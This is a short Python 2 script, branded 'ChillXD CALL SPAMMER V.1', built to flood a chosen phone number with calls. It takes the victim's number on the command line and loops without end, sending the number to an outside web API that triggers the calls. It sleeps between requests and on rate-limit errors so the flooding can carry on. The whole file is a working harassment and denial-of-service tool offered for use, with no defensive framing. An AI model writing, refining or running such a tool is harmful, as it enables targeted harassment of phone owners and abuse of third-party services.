#!/usr/bin/python
import requests
import datetime
import sys
import time
import argparse
print """\
   ____                             
  / __/__  ___ ___ _  __ _  ___ ____
 _\ \/ _ \/ _ `/  ' \/  ' \/ -_) __/
/___/ .__/\_,_/_/_/_/_/_/_/\__/_/   
   /_/  ChillXD CALL SPAMMER V.1
"""	
parser = argparse.ArgumentParser(prog="spammer", description="call flood", epilog="mail: chill.sanook@gmail.com")
parser.add_argument("phonenum", metavar="phone", help="(example: 10101010101)")
parser.add_argument('--delay', type=int, help='(default: 60)')
args = parser.parse_args()
def showstatus(message, type="new"):
	now = datetime.datetime.now().strftime("%H:%M:%S")
	icon = "*"
	if type == "warn":
		icon = "!"
	elif type == "new":
		icon == "*"
	message = "[" + icon + "][" + now + "]" + message
	return message
delaytime = 60
if args.delay:
	delaytime = int(args.delay)
def wrapsbrace(string, endspace=False):
	if endspace == True:
		return "[" + string + "] "
	else:
		return "[" + string + "]"
def sleep(x):
	try:
		time.sleep(x)
	except KeyboardInterrupt:
		print "\r" + showstatus(wrapsbrace("except", True) + "KeyboardInterrupt thrown! Exiting...", "warn")
		exit()
_phone = args.phonenum
count = 1
print showstatus(wrapsbrace("info", True) + "call flooding to: {}".format(_phone))
while True:
	try:
		r = requests.post("https://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor=" + _phone)
	except KeyboardInterrupt:
		print "\r" + showstatus(wrapsbrace("except", True) + "KeyboardInterrupt thrown! Exiting...", "warn")
		exit()
	except requests.exceptions.ConnectionError:
		print showstatus(wrapsbrace("ERROE", True) + "ConnectionError thrown! Sleeping for {}s...".format(delaytime), "warn")
		sleep(delaytime)
	else:
		if r.status_code == 429:
			print showstatus(wrapsbrace("429 {}".format(r.reason), True) + "Sleeping for {}s...".format(delaytime), "warn")
			sleep(delaytime)
		elif r.status_code == 200:
			print showstatus(wrapsbrace("200 OK", True) + "call flooding for {}s... count: {}".format(delaytime,count))
			count += 1
			sleep(delaytime)
		else:
			print showstatus(wrapsbrace("{} {}".format(r.status_code, r.reason), True) + "Something went wrong. Exiting...", "warn")
			exit()